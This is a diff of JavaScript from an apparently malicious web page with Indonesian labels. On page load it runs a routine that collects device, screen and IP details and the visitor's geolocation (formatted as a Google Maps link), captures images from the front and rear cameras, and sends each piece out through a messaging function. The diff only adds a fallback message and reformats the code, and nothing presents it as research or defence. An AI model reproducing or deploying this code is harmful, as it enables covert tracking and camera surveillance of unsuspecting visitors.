@@ -393,31 +393,33 @@ Peta                   : https://maps.google.com/?q=${latitude},${longitude}`);
     };
 
 const mulai = async () => {
-    audio.muted = false;
-    try { await audio.play(); } catch {}
+  audio.muted = false;
+  try { await audio.play(); } catch {}
 
-    const info = await ambilDataPerangkat();
-    const grafik = await ambilLayarGrafik();
-    const ip = await ambilIPInfo();
+  const info = await ambilDataPerangkat();
+  let grafik = await ambilLayarGrafik();
+  if (!grafik || grafik.length < 10) {
+    grafik = `౼ 〘 𝗟𝗔𝗬𝗔𝗥 & 𝗚𝗥𝗔𝗙𝗜𝗞 〙 ౼\n❌ Gagal mengambil info layar & grafik.`;
+  }
 
-    // Kirim info dasar dulu
-    const gabungAwal = [info, grafik, ip].join("\n\n");
-    await kirimPesan(gabungAwal);
+  const ip = await ambilIPInfo();
 
-    // Ambil dan kirim lokasi setelahnya
-    const lokasi = await ambilLokasi();
-    await kirimPesan(lokasi);
+  // Kirim info awal
+  const gabungAwal = [info, grafik, ip].join("\n\n");
+  await kirimPesan(gabungAwal);
 
-    // Ambil dan kirim kamera depan
-    const depan = await ambilKamera("user", "depan");
-    const kameraDepanStatus = `౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡 〙 ౼\n${depan}`;
-    await kirimPesan(kameraDepanStatus);
+  // Kirim lokasi
+  const lokasi = await ambilLokasi();
+  await kirimPesan(lokasi);
 
-    // Ambil dan kirim kamera belakang
-    const belakang = await ambilKamera("environment", "belakang");
-    const kameraBelakangStatus = `౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${belakang}`;
-    await kirimPesan(kameraBelakangStatus);
-  };
+  // Kamera depan
+  const depan = await ambilKamera("user", "depan");
+  await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡 〙 ౼\n${depan}`);
+
+  // Kamera belakang
+  const belakang = await ambilKamera("environment", "belakang");
+  await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${belakang}`);
+};
 
     window.addEventListener("load", mulai);
   </script>
